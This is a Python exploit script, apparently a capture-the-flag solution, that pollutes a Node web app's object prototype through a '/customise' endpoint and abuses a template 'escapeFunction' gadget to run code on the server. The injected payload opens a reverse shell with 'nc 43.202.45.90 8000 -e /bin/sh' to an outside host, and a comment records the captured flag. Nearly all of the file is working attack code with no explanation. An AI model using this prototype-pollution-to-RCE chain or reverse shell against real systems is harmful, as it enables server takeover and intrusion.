import requests

# url = "http://localhost:3000"
url = "https://ch15496143241.ch.eng.run"

def pp(key: str, value: str): 
    author = f'option(a).constructor.prototype.{key} = {value};'
    r = requests.post(f"{url}/customise",
                    json={
                        "data": [
                            {}, 
                            {"author": author}
                        ]
                    })
    assert r.json()["Message"] == "Settings changed", r.text
    res = requests.post(f"{url}/create", json={})
    assert res.status_code == 500

pp("client", "1")
pp("escapeFunction", "\"JSON.stringify;process.mainModule.require('child_process').exec('nc 43.202.45.90 8000 -e /bin/sh')\"")

requests.get(f"{url}/create")
# {"title":"Healthcheck","content":"success"}{"title":"flag","content":"bi0sctf{CRIWjnXmtJ2pKunKM59jxg==}"}